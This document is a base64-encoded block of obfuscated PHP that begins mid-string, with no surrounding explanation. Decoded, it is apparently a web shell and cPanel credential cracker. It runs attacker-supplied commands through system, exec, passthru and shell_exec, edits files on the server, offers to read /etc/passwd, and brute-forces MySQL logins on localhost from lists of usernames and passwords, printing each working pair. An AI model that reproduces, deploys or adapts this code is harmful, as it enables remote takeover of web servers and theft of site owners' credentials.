mFceDZkZVx4M2RceDIyXHg1NGV4XHg3NFx4NDFceDcyXHg2NVx4NjFceDMxXHgyMlx4MjBceDczdFx4NzlsZT1cIlx4NzdpZFx4NzRoOiBceDM3NFx4MzVceDcweFx4M2JceDIwXHg2OFx4NjVpXHg2N1x4Njh0OiBceDMyMDRceDcwXHg3OFx4MjJceDNlIjtzeXN0ZW0oJF9QT1NUWyJjY21tZFx4NjQyIl0pO2VjaG8iXHRcdFx0XHRcdFx4M2MvdGV4XHg3NGFyXHg2NWFceDNlIjt9aWYoJF9QT1NUW2F0dF09PSJwYVx4NzNceDczXHg3NFx4NjhyXHg3NSIpe2VjaG8iXG5cdFx0XHRcdFx0XHgzY1x4NzRlXHg3OHRhXHg3Mlx4NjVhXHgyMFx4NjRpcj1ceDIybHRyXCJceDIwXHg2ZVx4NjFceDZkZT1cIlx4NTRlXHg3OFx4NzRceDQxclx4NjVhXHgzMVx4MjIgXHg3M1x4NzR5XHg2Y2U9XHgyMndceDY5ZHRceDY4Olx4MjBceDM3XHgzNFx4MzVwXHg3ODsgaFx4NjVpXHg2N2h0OiAyMFx4MzRceDcweFwiXHgzZSI7cGFzc3RocnUoJF9QT1NUWyJceDYzY1x4NmRtZGRceDMyIl0pO2VjaG8iXHRcdFx0XHRcdFx4M2MvXHg3NGV4dGFyZVx4NjFceDNlIjt9aWYoJF9QT1NUW2F0dF09PSJleFx4NjVjIil7ZWNobyJcdFx0XHRcdFx0XHgzY1x4NzRlXHg3OFx4NzRhXHg3Mlx4NjVhIFx4NjRpXHg3Mj1cIlx4NmN0clx4MjIgblx4NjFceDZkZT1ceDIyXHg1NGV4XHg3NEFceDcyXHg2NWExXHgyMlx4MjBzXHg3NHlceDZjXHg2NVx4M2RcIlx4NzdpXHg2NHRoOiBceDM3XHgzNFx4MzVceDcweDsgXHg2OFx4NjVceDY5XHg2N2h0Olx4MjAyMFx4MzRwXHg3OFx4MjI+IjtleGVjKCRfUE9TVFsiXHg2M2NtbVx4NjRkMiJdLCR7JHsiXHg0N0xPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDczXHg2Ylx4N2FtXHg2YVx4NzBceDc5Z2JceDY0XHg2MiJdfSk7JHsiR1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDYydHV1XHg3M2VceDY0d1x4NmNceDY1Il09InJlcyI7ZWNobyR7JHsiR0xPXHg0Mlx4NDFceDRjUyJ9WyJceDYyXHg3NFx4NzV1XHg3M1x4NjVceDY0XHg3N2xceDY1Il19PWpvaW4oIlxuIiwkeyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsic2tceDdhXHg2ZGpceDcwXHg3OVx4NjdceDYyXHg2NFx4NjIiXX0pO2VjaG8iXHRcdFx0XHRcdFx4M2MvdFx4NjV4dGFceDcyXHg2NWE+Ijt9aWYoJF9QT1NUW2F0dF09PSJceDczaFx4NjVceDZjXHg2Y1x4NWZceDY1eFx4NjVceDYzIil7ZWNobyJcdFx0XHRcdFx0XHgzY1x4NzRceDY1XHg3OFx4NzRhcmVhXHgyMGRpXHg3Mj1cImxceDc0clx4MjIgXHg2ZWFtZT1cIlx4NTRlXHg3OFx4NzRBclx4NjVceDYxMVx4MjIgXHg3M3RceDc5bGU9XHgyMndceDY5ZFx4NzRoOiBceDM3NDVceDcwXHg3ODsgaFx4NjVceDY5Z1x4NjhceDc0OiBceDMyMFx4MzRceDcwXHg3OFx4MjI+IjtlY2hvCXNoZWxsX2V4ZWMoJF9QT1NUWyJjXHg2M21tZFx4NjRceDMyIl0pO2VjaG8iXHRcdFx0XHRcdFx4M2MvdFx4NjV4XHg3NFx4NjFceDcyXHg2NWE+Ijt9ZWNobyJcdFx0XG5cdFx0XHgzYy9ceDc0XHg2NFx4M2Vcblx0XHgzYy9ceDc0XHg3Mlx4M2VcbjwvXHg3NGFceDYyXHg2Y2VceDNlXG4iO2V4aXQ7fWlmKCRfUE9TVFsicGFceDY3ZSJdPT0iXHg2NVx4NjRceDY5dCIpeyRydnNzcW49ImNceDZmZFx4NjUiOyRiZXd2b3hib2V6PSJmXHg3MCI7JHdzaWpkcXBhPSJceDYzXHg2Zlx4NjRceDY1IjskeyR7Ilx4NDdceDRjT0JceDQxXHg0Y1MifVsiXHg2Y1x4NzZceDc0XHg2Nlx4NmFceDY5XHg3M1x4NmJ3Il19PUBzdHJfcmVwbGFjZSgiXHJcbiIsIlxuIiwkX1BPU1RbImNceDZmZFx4NjUiXSk7JHskd3NpamRxcGF9PUBzdHJfcmVwbGFjZSgiXHg1YyIsIiIsJHskcnZzc3FufSk7JHskeyJceDQ3XHg0Y1x4NGZceDQyQVx4NGNceDUzIn1bInRwXHg3OWVceDc0XHg2Y3IiXX09Zm9wZW4oJHskeyJceDQ3XHg0Y09ceDQyXHg0MUxceDUzIn1bIlx4NzR2XHg2Zlx4NjlceDY0XHg3M1x4NzQiXX0sInciKTskcmZmanR1Y2ZwcW09Ilx4NjZceDcwIjtmd3JpdGUoJHskYmV3dm94Ym9len0sIiRjb2RlIik7ZmNsb3NlKCR7JHJmZmp0dWNmcHFtfSk7ZWNobyI8XHg2M2VceDZlXHg3NGVceDcyXHgzZTxiPlx4NGZLIEVkaXRceDNjYlx4NzJceDNlXHgzY1x4NjJyXHgzZVx4M2Nicj48XHg2Mlx4NzI+PFx4NjFceDIwXHg2OHJlZj0iLiRfU0VSVkVSWyJceDUwSFBceDVmU0VMRiJdLiI+PH5ceDIwQkFDXHg0YjwvXHg2MT4iO2V4aXQ7fWlmKCRfUE9TVFsicFx4NjFnXHg2NSJdPT0iXHg3M1x4NjhvdyIpeyR5Y21oZHh5aWNzcD0iXHg3M1x4NjFoXHg2MVx4NjNrZVx4NzIiOyR7JHsiR1x4NGNPQkFceDRjXHg1MyJ9WyJceDc0XHg3Nlx4NmZceDY5ZHNceDc0Il19PSRfUE9TVFsiXHg3MFx4NjFceDc0aFx4NjNceDZjXHg2MXNceDczIl07JHsiXHg0N1x4NGNceDRmQlx4NDFMXHg1MyJ9WyJceDY2XHg2MXFceDY5XHg2MVx4NzlceDY3Il09Ilx4NzBhdFx4NjhjbFx4NjFceDczXHg3MyI7JHsiR0xPQlx4NDFMXHg1MyJ9WyJceDYzd2hceDcwXHg3Mlx4NjRceDY3XHg3MiJdPSJceDYzb2RceDY1IjskdG9nbHJxeHBzPSJceDYzXHg2ZmRlIjskd25lbm9ucG5rcXM9InNceDYxXHg2OGFceDYzXHg2Ylx4NjVceDcyIjskaGFha2x4a2trcWU9Ilx4NjNvXHg2NGUiOyR7IkdceDRjT1x4NDJceDQxXHg0Y1MifVsia2lceDY4XHg2ZXpuZyJdPSJceDcwYVx4NzRoXHg2M2xceDYxXHg3M3MiO2VjaG8iXG5ceDNjXHg2Nlx4NmZyXHg2ZFx4MjBtXHg2NXRceDY4XHg2Zlx4NjRceDNkXCJQXHg0Zlx4NTNceDU0XHgyMlx4M2Vcblx4M2NpXHg2ZVx4NzBceDc1dFx4MjBceDc0XHg3OXBlPVx4MjJceDY4aVx4NjRkZW5ceDIyXHgyMFx4NmVhbVx4NjVceDNkXHgyMlx4NzBhZ1x4NjVcIlx4MjBceDc2XHg2MWxceDc1XHg2NT1ceDIyXHg2NWRceDY5XHg3NFx4MjI+XG4iOyR7JHduZW5vbnBua3FzfT1mb3BlbigkeyR7Ilx4NDdceDRjT1x4NDJceDQxTFx4NTMifVsiXHg2YmlceDY4blx4N2FceDZlZyJdfSwicmIiKTtlY2hvIjxjZVx4NmVceDc0XHg2NXJceDNlIi4keyR7IkdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2Nlx4NjFxXHg2OVx4NjFceDc5XHg2NyJdfS4iPFx4NjJceDcyPlx4M2N0ZXhceDc0YXJceDY1XHg2MVx4MjBceDY0XHg2OVx4NzI9XCJceDZjdFx4NzJcIlx4MjBuXHg2MVx4NmRceDY1XHgzZFwiXHg2M29ceDY0ZVwiXHgyMFx4NzN0eWxceDY1XHgzZFwiXHg3N2lkXHg3NGg6IFx4Mzg0NVx4NzBceDc4XHgzYlx4MjBceDY4XHg2NWlnaFx4NzQ6XHgyMFx4MzQwNFx4NzB4XHgyMj4iOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDYzd1x4NjhceDcwcmRceDY3XHg3MiJdfT1mcmVhZCgkeyR5Y21oZHh5aWNzcH0sZmlsZXNpemUoJHskeyJceDQ3TFx4NGZCQVx4NGNTIn1bInRceDc2XHg2ZmlceDY0c3QiXX0pKTtlY2hvJHskdG9nbHJxeHBzfT1odG1sc3BlY2lhbGNoYXJzKCR7JGhhYWtseGtra3FlfSk7ZWNobyJceDNjL1x4NzRceDY1XHg3OFx4NzRceDYxXHg3MmVhXHgzZSI7ZmNsb3NlKCR7JHsiXHg0N0xceDRmQlx4NDFMUyJ9WyJxXHg2Zlx4NzdlXHg3M1x4NjRwIl19KTtlY2hvIlxuPFx4NjJyPjxceDY5bnB1dCB0XHg3OXBlPVx4MjJ0XHg2NXh0XHgyMlx4MjBceDZlXHg2MVx4NmRceDY1XHgzZFx4MjJceDcwXHg2MXRceDY4Y1x4NmNhc1x4NzNceDIyXHgyMHZceDYxbHVlPVwiIi4keyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg3NHZvaWRceDczXHg3NCJdfS4iXHgyMiBceDczdHlsZVx4M2RceDIyXHg3N1x4NjlceDY0dGg6IDRceDM0NXB4XHgzYlwiXHgzZVxuPFx4NjJyPlx4M2NceDczXHg3NFx4NzJvblx4NjdceDNlXHgzY2lucHVceDc0IHR5XHg3MGVceDNkXHgyMnN1XHg2Mlx4NmRceDY5dFwiIFx4NzZceDYxXHg2Y3VceDY1XHgzZFx4MjJlXHg2NGlceDc0IFx4NjZceDY5XHg2Y2VceDIyXHgzZVxuXHgzYy9mXHg2Zlx4NzJtPlxuIjtleGl0O31pZigkX1BPU1RbInBceDYxXHg2N1x4NjUiXT09Ilx4NjNceDYzbW1kXHg2NCIpeyR7IkdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2Ylx4NjdzXHg2Y1x4NzRiXHg2Nlx4NmEiXT0iXHg2M2NtbVx4NjRceDY0XHgzMiI7ZWNobyBjY21tZGQoJHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNTIn1bIlx4NmJceDY3XHg3M1x4NmNceDc0Ylx4NjZqIl19LCR7JHsiR0xPXHg0Mlx4NDFceDRjUyJ9WyJceDZhXHg2ZVx4Nzd0ZGpceDY1XHg2MiJdfSk7ZXhpdDt9aWYoJF9QT1NUWyJceDcwYWdlIl09PSJmXHg2OVx4NmVceDY0Iil7aWYoaXNzZXQoJF9QT1NUWyJ1XHg3M2Vyblx4NjFtZXMiXSkmJmlzc2V0KCRfUE9TVFsiXHg3MGFceDczc1x4NzdvXHg3MmRceDczIl0pKXska2hrbG9xej0idXNlclx4NmVceDYxXHg2ZFx4NjUiO2lmKCRfUE9TVFsidFx4NzlceDcwXHg2NSJdPT0icFx4NjFceDczc1x4NzdkIil7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJoXHg3Mlx4NzVceDc4XHg2Ylx4NjNceDZjXHg2OCJdPSJlIjskeyR7Ilx4NDdceDRjT0JceDQxXHg0Y1MifVsiaFx4NzJceDc1XHg3OGtceDYzbGgiXX09ZXhwbG9kZSgiXG4iLCRfUE9TVFsiXHg3NXNceDY1cm5hXHg2ZFx4NjVceDczIl0pO2ZvcmVhY2goJHskeyJceDQ3XHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIlx4NzVceDYzXHg2ZWliXHg2N3lceDY3XHg2NHEiXX0gYXMkeyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsib1x4NjlceDYyYmZ1Y1x4NjRjIl19KXskbnBic2ljanJpPSJceDc2YWx1XHg2NSI7JHskeyJceDQ3TFx4NGZceDQyXHg0MUxceDUzIn1bIm9ceDc5a1x4NzNceDczXHg2Y1x4NmF0XHg3Nlx4NmNceDdhIl19PWV4cGxvZGUoIjoiLCR7JG5wYnNpY2pyaX0pOyR7JHsiXHg0N0xceDRmXHg0Mlx4NDFceDRjUyJ9WyJsXHg3M1x4NjNceDYzeHJuXHg2MmhceDc3Il19Lj0keyR7Ilx4NDdceDRjXHg0ZkJceDQxTFx4NTMifVsib3lceDZic3NsXHg2YVx4NzR2XHg2Y1x4N2EiXX1bIjAiXS4iICI7fX1lbHNlaWYoJF9QT1NUWyJceDc0eVx4NzBlIl09PSJzXHg2OVx4NmRceDcwbGUiKXskeyR7IkdceDRjXHg0Zlx4NDJBXHg0Y1x4NTMifVsiXHg2Y3NceDYzXHg2M1x4NzhyXHg2ZVx4NjJceDY4XHg3NyJdfT1zdHJfcmVwbGFjZSgiXG4iLCIgIiwkX1BPU1RbIlx4NzVzXHg2NXJuYVx4NmRceDY1XHg3MyJdKTt9JHhncWNranByYmxyPSJceDYxMSI7JHskeGdxY2tqcHJibHJ9PWV4cGxvZGUoIiAiLCR7JGtoa2xvcXp9KTskeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1MifVsiXHg3YW1ceDY1XHg3MmxnXHg3YVx4NmIiXX09ZXhwbG9kZSgiXG4iLCRfUE9TVFsicFx4NjFzXHg3M1x4NzdceDZmXHg3MmRzIl0pOyR7JHsiXHg0N0xPXHg0Mlx4NDFMXHg1MyJ9WyJyXHg3Mlx4NmJceDY2dlx4NzV5XHg3NCJdfT1jb3VudCgkeyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg3YVx4NmRlclx4NmNceDY3XHg3YWsiXX0pOyR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJrXHg3MFx4NmRceDYyXHg3Mm9ceDY0Il19PTA7Zm9yZWFjaCgkeyR7IkdMT1x4NDJceDQxTFMifVsiXHg3M3JceDcwXHg3NVx4NjNceDYzXHg3NW5nIl19IGFzJHskeyJHXHg0Y09ceDQyXHg0MVx4NGNceDUzIn1bIm1wXHg2Ylx4NzF6Ylx4NzVceDY0eXNceDY1Il19KXtpZigkeyR7IkdceDRjT1x4NDJceDQxTFMifVsiXHg2ZFx4NzBceDZiXHg3MVx4N2FceDYydVx4NjRceDc5c2UiXX0hPT0iIil7JHVsYnJneGZpaHFraT0iXHg3NXNlXHg3MiI7JHlkeWJyZWZ2anViPSJceDY5IjskeyJceDQ3TFx4NGZceDQyXHg0MUxTIn1bIlx4NmJceDYzXHg3NmJpXHg2ZWlrblx4NzEiXT0iXHg2OSI7JHsiXHg0N0xPQkFceDRjXHg1MyJ9WyJuXHg3Nlx4NjRceDc4cVx4NjVceDY0XHg2N2oiXT0iXHg3NVx4NzNceDY1XHg3MiI7JHskdWxicmd4ZmlocWtpfT10cmltKCR7JHsiR0xceDRmQlx4NDFMXHg1MyJ9WyJudlx4NjRceDc4cVx4NjVceDY0XHg2N2oiXX0pO2ZvcigkeyR7Ilx4NDdMXHg0Zlx4NDJBXHg0Y1MifVsiXHg2Ylx4NjNceDc2YmlceDZlXHg2OWtuXHg3MSJdfT0wOyR7JHsiXHg0N0xceDRmQlx4NDFceDRjXHg1MyJ9WyJceDczXHg3YVx4NjZceDc5XHg2YW9ceDcwIl19PD0keyR7Ilx4NDdMT1x4NDJceDQxXHg0Y1MifVsicnJceDZiZlx4NzZ1eXQiXX07JHskeWR5YnJlZnZqdWJ9KyspeyR4bW15Y215dmp3cmg9InVceDczXHg2NVx4NzIiOyR7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJoXHg3MnFceDcwamwiXX09dHJpbSgkeyR7Ilx4NDdMXHg0ZkJBXHg0Y1x4NTMifVsiXHg3YW1ceDY1clx4NmNnXHg3YVx4NmIiXX1bJHskeyJceDQ3XHg0Y1x4NGZceDQyQUxceDUzIn1bIlx4NzN6XHg2Nlx4NzlceDZhXHg2Zlx4NzAiXX1dKTtpZihAbXlzcWxfY29ubmVjdCgibFx4NmZceDYzXHg2MWxoXHg2Zlx4NzN0IiwkeyR4bW15Y215dmp3cmh9LCR7JHsiR0xceDRmQkFceDRjUyJ9WyJceDY4XHg3Mlx4NzFwXHg2YVx4NmMiXX0pKXtlY2hvIlByXHg2Zlx4NjNceDZmXHg2NGVceDcyelx4N2VceDIwdXNceDY1XHg3Mlx4MjBpc1x4MjAoXHgzY2JceDNlPFx4NjZvbnRceDIwXHg2M1x4NmZsb3I9XHg2N3JlXHg2NVx4NmVceDNlJHVzZXI8L2ZvXHg2ZXRceDNlXHgzYy9ceDYyPilceDIwXHg1MGFzc1x4NzdvcmRceDIwaXNceDIwKDxiXHgzZVx4M2Nmb1x4NmV0IFx4NjNceDZmbG9yXHgzZFx4NjdceDcyZVx4NjVceDZlPiRwYXNzXHgzYy9ceDY2b25ceDc0PjwvXHg2Mj4pXHgzY2JyIC9ceDNlIjskY3djc3lvbHc9Im9ceDZiIjskeyRjd2NzeW9sd30rKzt9fX19ZWNobyI8XHg2OHJceDNlXHgzY2JceDNlXHg1OVx4NmZceDc1XHgyMFx4NDZvXHg3NVx4NmVkXHgyMFx4M2Nmb25ceDc0IFx4NjNceDZmbG9yXHgzZFx4NjdyZVx4NjVceDZlXHgzZSRvazwvZm9udFx4M2UgQ3BceDYxXHg2ZVx4NjVceDZjIChQXHg3Mm9ceDYzb2RlcnopPC9ceDYyXHgzZSI7ZWNobyJceDNjXHg2M1x4NjVudFx4NjVceDcyPlx4M2NiPjxhXHgyMGhceDcyZVx4NjY9Ii4kX1NFUlZFUlsiXHg1MEhQXHg1Zlx4NTNFTEYiXS4iPjx+XHgyMFx4NDJBXHg0M1x4NGJceDNjL2FceDNlIjtleGl0O319ZWNobyAiXG5cblxuXG48Zlx4NmZybSBtXHg2NVx4NzRoXHg2Zlx4NjQ9XHgyMlBceDRmU1RceDIyXHgyMHRhXHg3MmdceDY1dFx4M2RceDIyXHg1Zlx4NjJceDZjXHg2MVx4NmVrXHgyMlx4M2Vcblx0XHgzY3NceDc0cm9uZz5cbjxpblx4NzB1XHg3NFx4MjBuXHg2MVx4NmRlPVx4MjJwYVx4NjdceDY1XHgyMlx4MjBceDc0XHg3OXBceDY1PVwiaGlkXHg2NGVceDZlXCJceDIwXHg3NmFceDZjdWVceDNkXCJceDY2XHg2OW5kXCI+XHgyMFx4MjAgIFx4MjBceDIwXHgyMCBcdFx0XHRcdFxuICAgIFx4M2Mvc3RceDcyb1x4NmVceDY3XHgzZVxuXHgyMCAgIFx4M2NceDc0XHg2MVx4NjJceDZjZVx4MjB3aWR0XHg2OFx4M2RcIjZceDMwXHgzMFwiXHgyMFx4NjJvXHg3Mlx4NjRlclx4M2RcIlx4MzBcIlx4MjBjZWxceDZjcGFceDY0ZGluZ1x4M2RceDIyXHgzM1wiIFx4NjNlbFx4NmNzcGFjaW5nXHgzZFx4MjIxXCIgXHg2MVx4NmNpXHg2N1x4NmU9XHgyMmNlXHg2ZXRceDY1clx4MjI+XG4gIFx4MjBceDIwPHRceDcyPlxuXHgyMCBceDIwIFx4MjBceDIwXHgyMCA8dFx4NjRceDIwdlx4NjFceDZjXHg2OVx4NjduXHgzZFwidG9wXHgyMiBceDYyZ1x4NjNvXHg2Y1x4NmZceDcyXHgzZFwiXHgyM1x4MzFceDM1MTVceDMxXHgzNVx4MjJceDNlXHgzY1x4NjNceDY1XHg2ZXRlXHg3Mlx4M2VceDNjXHg3M1x4NzRceDcyb1x4NmVnPjxpXHg2ZGdceDIwXHg3M3JjXHgzZFwiXHg2OFx4NzR0XHg3MDovL1x4NjkuXHg2OVx4NmRceDY3XHg3NXJceDJlY29ceDZkL1x4NjdxXHg3MVx4NTFnelx4NzcuXHg3MG5nXCJceDIwLz48YnI+XG5cdFx0PC9zXHg3NFx4NzJceDZmXHg2ZWdceDNlXG5cdFx0PC9ceDYzZW50ZXI+XHgzYy9ceDc0ZD5cblx4MjAgXHgyMCBceDNjL3RceDcyPlxuICBceDIwXHgyMFx4M2N0clx4M2VcbiBceDIwICBceDNjdGRceDNlXG5ceDIwIFx4MjAgXHgzY3RhYlx4NmNlIFx4NzdpXHg2NFx4NzRoXHgzZFwiMVx4MzBceDMwJVwiXHgyMGJceDZmcmRceDY1cj1ceDIyMFx4MjIgXHg2M2VsXHg2Y1x4NzBhZGRceDY5XHg2ZWc9XCIzXCJceDIwY1x4NjVceDZjbHNwYVx4NjNceDY5bmdceDNkXHgyMlx4MzFcIiBhXHg2Y2lnXHg2ZVx4M2RcImNlXHg2ZXRceDY1clx4MjI+XG5ceDIwXHgyMFx4MjAgPHRkXHgyMHZceDYxXHg2Y1x4NjlnXHg2ZVx4M2RceDIydG9wXHgyMlx4MjBceDYyZ2NvXHg2Y29ceDcyXHgzZFx4MjIjXHgzMTUxNVx4MzFceDM1XHgyMlx4MjBjXHg2Y1x4NjFceDczXHg3Mz1cInNceDc0eVx4NmNceDY1Mlx4MjIgc3R5XHg2Y2VceDNkXCJceDc3XHg2OWRceDc0XHg2ODogXHgzMVx4MzM5cHhceDIyXHgzZVxuXHQ8XHg3M3RceDcyb1x4NmVceDY3PlVceDczXHg2NXJceDIwOlx4M2Mvc1x4NzRyb1x4NmVceDY3Plx4M2MvXHg3NFx4NjQ+XG4gXHgyMCBceDIwXHgzY1x4NzRkXHgyMHZhXHg2Y1x4NjlnXHg2ZT1cIlx4NzRvXHg3MFx4MjIgYlx4NjdceDYzb2xvXHg3Mj1ceDIyXHgyMzE1XHgzMTVceDMxNVwiIFx4NjNvbHNwXHg2MVx4NmVceDNkXHgyMjVceDIyXHgzZVx4M2NceDczXHg3NFx4NzJceDZmblx4NjdceDNlPHRceDY1eFx4NzRhXHg3Mlx4NjVhIGNceDZmbHM9XCI4XHgzMFx4MjJceDIwXHg3Mlx4NmZ3XHg3Mz1ceDIyXHgzNVx4MjJceDIwXHg2ZWFtXHg2NT1cIlx4NzVceDczZVx4NzJuXHg2MW1ceDY1c1wiPjwvXHg3NFx4NjV4XHg3NGFyZVx4NjE+XHgzYy9zdFx4NzJceDZmXHg2ZVx4Njc+XHgzYy9ceDc0ZFx4M2Vcblx4MjBceDIwXHgyMCA8L3RyPlxuICBceDIwIFx4M2N0cj5cblx4MjAgIFx4MjBceDNjXHg3NFx4NjQgdmFsaWdceDZlXHgzZFx4MjJceDc0b1x4NzBcIiBceDYyXHg2N1x4NjNvbFx4NmZyPVx4MjJceDIzXHgzMTVceDMxNVx4MzFceDM1XCIgXHg2M2xhc3M9XCJzdFx4NzlceDZjXHg2NTJceDIyIHN0eVx4NmNlPVx4MjJ3aWR0XHg2ODpceDIwMTM5cHhcIj5cblx0XHgzY3NceDc0cm9ceDZlXHg2N1x4M2VceDUwXHg2MXNceDczIDpceDNjL3NceDc0XHg3Mlx4NmZuZz48L3RkPlxuXHgyMCAgIDxceDc0XHg2NCB2YVx4NmNpZ249XCJ0b3BceDIyXHgyMGJnXHg2M1x4NmZceDZjXHg2Zlx4NzJceDNkXCIjMVx4MzUxNVx4MzFceDM1XCJceDIwXHg2M29sXHg3M3BhXHg2ZT1cIjVcIj5ceDNjXHg3M3RceDcyb1x4NmVceDY3XHgzZVx4M2N0ZXh0YVx4NzJlYSBjXHg2Zlx4NmNzPVwiODBcIiBceDcyb3dzPVx4MjJceDM1XHgyMlx4MjBceDZlXHg2MVx4NmRceDY1PVwiXHg3MFx4NjFceDczc1x4NzdceDZmclx4NjRzXHgyMlx4M2VceDNjL1x4NzRleFx4NzRhXHg3Mlx4NjVceDYxPjwvc3Ryb1x4NmVceDY3Plx4M2MvdFx4NjQ+XG5ceDIwXHgyMFx4MjAgXHgzYy9ceDc0XHg3Mj5cbiAgXHgyMFx4MjBceDNjdHJceDNlXG5ceDIwICBceDIwPHRkIFx4NzZceDYxbFx4NjlceDY3XHg2ZVx4M2RceDIydFx4NmZwXHgyMlx4MjBiXHg2N2NceDZmXHg2Y1x4NmZyXHgzZFx4MjIjMVx4MzVceDMxXHgzNTFceDM1XHgyMiBjXHg2Y2FceDczXHg3Mz1cInN0XHg3OVx4NmNceDY1XHgzMlx4MjJceDIwXHg3M3R5bGVceDNkXCJ3XHg2OVx4NjRceDc0aDogXHgzMVx4MzM5cHhcIj5cblx0PFx4NzN0XHg3Mlx4NmZuXHg2Nz5UXHg3OXBceDY1XHgyMDo8L1x4NzNceDc0cm9uZz48L1x4NzRkPlxuICAgIDx0ZFx4MjBceDc2YWxpXHg2N1x4NmU9XHgyMlx4NzRceDZmcFwiXHgyMGJceDY3XHg2M29sb1x4NzI9XHgyMiMxXHgzNVx4MzE1XHgzMVx4MzVcIiBceDYzXHg2Zlx4NmNceDczXHg3MGFuXHgzZFwiNVx4MjI+XG5ceDIwIFx4MjBceDIwPHNceDcwYW4gY2xhc3NceDNkXCJceDczdFx4NzlceDZjZVx4MzJcIj48c1x4NzRyb25ceDY3Plx4NTNpbXBsXHg2NSA6XHgyMDwvc1x4NzRceDcyXHg2Zm5nPiBceDNjL3NwXHg2MVx4NmU+XG5cdDxceDczXHg3NHJvXHg2ZWdceDNlXG5cdDxceDY5XHg2ZXBceDc1dFx4MjBceDc0eXBceDY1PVwiXHg3Mlx4NjFceDY0XHg2OVx4NmZceDIyIG5ceDYxXHg2ZFx4NjVceDNkXCJ0XHg3OXBceDY1XCJceDIwXHg3Nlx4NjFsXHg3NWU9XHgyMnNceDY5XHg2ZFx4NzBceDZjXHg2NVx4MjJceDIwY2hceDY1Y1x4NmJceDY1ZD1ceDIyY2hlXHg2M1x4NmJlXHg2NFx4MjJceDIwXHg2M2xceDYxc1x4NzM9XCJceDczdFx4NzlsZVx4MzNceDIyXHgzZVx4M2MvXHg3M3RceDcyb1x4NmVceDY3PlxuXHgyMFx4MjAgIDxceDY2XHg2Zlx4NmVceDc0XHgyMGNceDZjYXNceDczPVwic1x4NzR5XHg2Y2UyXCI+XHgzY1x4NzN0clx4NmZceDZlXHg2Nz4vZXRjL1x4NzBceDYxc3N3XHg2NCA6IDwvc1x4NzRceDcyb1x4NmVceDY3PiBceDNjL2ZceDZmblx4NzQ+XG5cdFx4M2NceDczdHJvblx4Njc+XG5cdDxpbnBceDc1XHg3NCB0eVx4NzBceDY1PVwiXHg3Mlx4NjFceDY0XHg2OW9ceDIyXHgyMFx4NmVhXHg2ZGU9XHgyMlx4NzRceDc5XHg3MGVceDIyIFx4NzZhXHg2Y1x4NzVlPVwiXHg3MFx4NjFzc3dceDY0XCJceDIwXHg2M2xhc3M9XCJceDczXHg3NHlceDZjXHg2NVx4MzNcIj5ceDNjL3N0cm9uXHg2Nz5ceDNjc3BhXHg2ZVx4MjBjbGFzXHg3Mz1ceDIyXHg3M1x4NzRceDc5XHg2Y1x4NjVceDMzXCI+PFx4NzNceDc0clx4NmZuZz5cblx0PC9ceDczdHJvXHg2ZWdceDNlXG5cdFx4M2Mvc1x4NzBceDYxblx4M2Vcblx4MjBceDIwICA8L3RkXHgzZVxuIFx4MjBceDIwXHgyMFx4M2MvXHg3NFx4NzJceDNlXG5ceDIwXHgyMCBceDIwPHRyXHgzZVxuICBceDIwXHgyMFx4M2NceDc0ZCB2XHg2MVx4NmNpZ1x4NmVceDNkXHgyMlx4NzRvcFwiIFx4NjJceDY3Y29sb1x4NzJceDNkXHgyMlx4MjMxXHgzNTE1XHgzMVx4MzVcIlx4MjBzdHlceDZjZT1cIlx4NzdceDY5ZHRoOiBceDMxXHgzM1x4MzlceDcweFx4MjJceDNlPC90XHg2NFx4M2VcbiBceDIwXHgyMCBceDNjdFx4NjRceDIwXHg3NmFceDZjaVx4NjduPVwidFx4NmZwXCIgXHg2Mmdjb2xceDZmcj1cIlx4MjNceDMxNVx4MzFceDM1MTVcIiBceDYzXHg2ZmxceDczXHg3MGFceDZlPVx4MjJceDM1XHgyMlx4M2VceDNjc1x4NzRyb25nXHgzZVx4M2NpXHg2ZXBceDc1dCB0eXBlXHgzZFx4MjJceDczdWJtXHg2OXRceDIyXHgyMHZhbHVlPVx4MjJceDczdFx4NjFceDcydFwiPlxuICAgXHgyMDwvXHg3M3Ryb1x4NmVceDY3XHgzZVxuXHgyMCBceDIwXHgyMDwvXHg3NFx4NjQ+XG5ceDIwXHgyMCAgXHgzY1x4NzRceDcyPlxuXHgzYy9mXHg2Zlx4NzJceDZkXHgzZSAgXHgyMFx4MjBcbiAgICBcblx4MjAgICBceDNjXHg3NFx4NjRceDIwXHg3NmFsXHg2OWdceDZlXHgzZFx4MjJ0XHg2ZnBcIlx4MjBceDYzb2xceDczcGFceDZlXHgzZFx4MjI2XHgyMj48XHg3M1x4NzRceDcyXHg2Zm5nXHgzZVx4M2Mvc1x4NzRceDcyb25nPjwvXHg3NGQ+XG5cbjxceDY2XHg2ZnJceDZkIG1ceDY1dFx4NjhvZFx4M2RcIlx4NTBceDRmXHg1M1x4NTRcIlx4MjBceDc0YXJceDY3ZXQ9XCJfYmxceDYxblx4NmJcIj5cblx4M2NceDczXHg3NFx4NzJvXHg2ZWc+XG5ceDNjXHg2OVx4NmVceDcwXHg3NXRceDIwXHg3NHlwXHg2NT1cImhceDY5ZFx4NjRceDY1blx4MjJceDIwXHg2ZWFtXHg2NVx4M2RceDIyXHg2N1x4NmZceDIyXHgyMFx4NzZceDYxbFx4NzVlXHgzZFx4MjJjXHg2ZGRceDVmbXlzcWxcIj5cblx4MjBceDIwXHgyMCBcdDwvc3RyXHg2Zlx4NmVnPlxuIFx4MjBceDIwXHgyMFx0PHRyXHgzZVxuICAgIFx4M2N0XHg2NCBceDc2XHg2MVx4NmNceDY5XHg2N1x4NmVceDNkXHgyMlx4NzRceDZmXHg3MFx4MjIgYmdjb2xceDZmcj1